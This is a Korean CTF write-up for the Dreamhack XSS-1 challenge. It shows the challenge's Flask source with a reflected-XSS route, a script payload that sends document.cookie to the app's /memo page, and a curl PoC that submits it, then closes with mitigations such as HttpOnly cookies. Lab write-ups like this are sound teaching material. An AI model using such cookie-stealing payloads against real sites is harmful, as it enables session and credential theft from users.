---
title: "[CTF] 드림핵 XSS-1"
date: 2025-09-18 18:05:00 +0900
categories: [CTF, Web]
tags: [CTF, XSS]
description: "드림핵 XSS-1"
toc: true
---

## 문제 개요
문제는 플라스크로 구현된 간단한 웹앱이었고, 내부에서 셀레니움을 돌려서 특정 URL을 방문시키는 로직이 있었다. `/vuln`, `/memo`, `/flag` 세 페이지를 확인했을 때 취약점은 명확했다.

- `/vuln?param=...` : param 값을 검증/이스케이프 없이 그대로 출력 (반사형 XSS 가능)
- `/memo?memo=...` : 전달된 memo 값을 누적해서 저장하고 출력
- `/flag` : POST로 받은 `param`을 내부 함수로 셀레니움 봇에게 전달 (봇은 `flag` 쿠키를 가지고 있음)

아래는 문제에서 제공된 **원본 소스코드 전체**다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
```

---

## 내가 실제로 푼 방법
문제를 보자마자 `/vuln`이 사용자 입력을 그대로 반환하는 걸 확인했고, `/flag`가 내부적으로 셀레니움으로 `/vuln?param=...` 을 호출함을 발견했다. 또한 그 셀레니움 봇은 `flag` 쿠키를 가지고 있었다(코드 `driver.add_cookie({"name": "flag", "value": FLAG.strip(), ...})`).

즉, 반사형 XSS로 `document.cookie`를 읽어 `/memo`에 전송하도록 만들면, 서버가 그 내용을 저장하므로 FLAG를 얻을 수 있다는 결론에 이르렀다.

### 내가 사용한 페이로드
```html
<script>location.href="/memo?memo="+document.cookie;</script>
```

### PoC 요청
```bash
curl -X POST -F 'param=<script>location.href="/memo?memo="+document.cookie;</script>' http://TARGET:8000/flag
```

설명:
- `/flag`로 POST하면 서버는 내부 `check_xss`를 호출하고, `check_xss`는 `urllib.parse.quote(param)`로 인코딩한 param을 `/vuln` URL에 넣어서 셀레니움 봇을 호출한다.
- 봇은 `flag` 쿠키가 설정된 상태로 `/vuln?param=<payload>` 를 열기 때문에, 페이지에서 스크립트가 실행되면 `document.cookie`는 FLAG 값을 포함하고, 스크립트는 `/memo?memo=<document.cookie>`로 리다이렉트해서 서버에 기록한다.
- 최종적으로 `/memo` 페이지에서 FLAG 내용을 확인했다.

---

## 재현 흐름
1. 공격자: `POST /flag` with `param=<스크립트>`  
2. 서버: `check_xss` → `read_url` → 셀레니움 실행 → `driver.add_cookie({"name":"flag","value":FLAG})` → `driver.get("/vuln?param=<payload>")`  
3. 봇(헤드리스 크롬): `/vuln` 페이지에서 `<script>location.href="/memo?memo="+document.cookie;</script>` 실행  
4. 봇: `/memo?memo=flag=<FLAG>` 호출 → 서버의 `memo_text`에 FLAG 저장  
5. 공격자: `/memo`에서 FLAG 확인

---

## 왜 이게 가능했나
- **반사형 XSS**: `/vuln`이 입력값에 대해 어떠한 이스케이프도 수행하지 않아 스크립트가 그대로 실행되었다.
- **봇의 쿠키 설정**: 서버가 봇에게 `flag` 쿠키를 설정했으며, 이 쿠키는 HttpOnly가 아니어서 자바스크립트로 읽을 수 있었다.
- **서버 설계 결함**: 외부에서 들어온 `param`을 검증 없이 내부 봇에 그대로 전달했다.

---

## 마무리
이 문제는 전형적인 반사형 XSS + 내부 자동화(봇)를 결합한 케이스였다. 원리는 단순하지만, 자동화된 브라우저가 민감한 값을 클라이언트 쿠키로 가지고 있다는 점이 굉장히 위험했다. 실전에서는 **민감값을 HttpOnly 쿠키에 보관**하거나 **자동화 브라우저가 외부 입력을 임의로 열지 않도록** 설계해야 한다.

---
